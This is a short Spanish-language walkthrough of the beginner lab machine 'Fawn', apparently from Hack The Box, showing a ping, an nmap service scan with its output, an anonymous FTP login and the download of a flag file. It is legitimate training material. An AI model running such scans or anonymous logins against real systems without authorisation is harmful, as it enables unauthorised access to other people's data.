# Fawn

En esta maquina primeriza aprendi sobre el servicio ftp (***File Transfer Protocol***)

pasos:
* ```ping -c 3 10.129.105.201```
* ```nmap -sS -sV 10.129.105.201```
###### Resultado:
```                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 21:51 -03
Nmap scan report for 10.129.105.201 (10.129.105.201)
Host is up (0.19s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
```
    * `-sV` da la version del servicio
* ```ftp 10.129.105.201``` => realizo la coneccion ftp
    * realizo la coneccion con el siguiente usuario y contrasenia: 
        * user: anonymous
        * password: anon123
    > anonymous es un usuario que existe por disenio historico
* ```ls``` => ya conectado a la maquina
* ```get flag.txt``` => envio flag.txt a mi computador
* ```bye``` => disconet
* ```cat flag.txt```